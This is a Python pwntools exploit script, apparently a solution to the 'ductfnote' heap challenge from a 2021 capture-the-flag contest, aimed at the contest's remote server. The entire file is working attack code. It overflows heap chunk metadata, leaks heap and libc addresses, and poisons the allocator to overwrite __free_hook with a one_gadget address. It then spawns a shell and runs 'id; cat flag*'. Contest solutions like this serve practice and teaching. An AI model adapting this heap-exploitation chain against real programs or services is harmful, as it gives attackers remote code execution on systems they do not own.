#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

exe = ELF('./ductfnote')
libc = ELF('./libc.so.6')

host, port = "pwn-2021.duc.tf","31917"

if args.LOCAL:
  p = process(exe.path)
else:
  p = remote(host,port)

def add(size):
  p.sendlineafter('>> ','1')
  p.sendlineafter('Size: ', str(size))

def edit(data):
  p.sendlineafter('>> ','3')
  p.sendline(data)

def delete():
  p.sendlineafter('>> ','4')

def show():
  p.sendlineafter('>> ','2')

# expand length
add(0x7f)
edit(b'A'*212+p64(0x21)+p32(0xffffffff)+p32(0)+p64(0)*2+p64(0x391))
delete()

add(0x3a0)
delete()

add(0x80)
delete()


add(0x300)
show()
buff = p.recvuntil('<-------------------------------->', drop=True)

heap = u64(buff[0x138:0x140])
print('heap = '+hex(heap))

edit(b'A'*128+b'\x00'*20+p64(heap)+p64(heap+0x2b0)+p64(heap+0x2b0)+b'\x00'*40 +p64(0x21)+p32(0xffffffff)+p32(0)+p64(0)*2+p64(0x3b1))

add(0x3a0)
edit(b'\x07\x00'*63)

delete()
add(0x80)
show()
buff = p.recvuntil('<-------------------------------->', drop=True)
leak_libc = u64(buff[0x28:0x30])
print('leak libc = '+hex(leak_libc))
libc.address = leak_libc - 0x1ebe60
print('libc base = '+hex(libc.address))

edit(b'bbbb'+p64(libc.symbols['__free_hook']-8)*15)
add(0x80)
edit(b'bbbb'+p64(libc.symbols['__free_hook']-8)*15)

onegadgets = one_gadget('libc.so.6', libc.address)
add(0x90)
edit(b'cccc'+p64(onegadgets[1]))

delete()

p.sendline('id; cat flag*')
p.interactive()

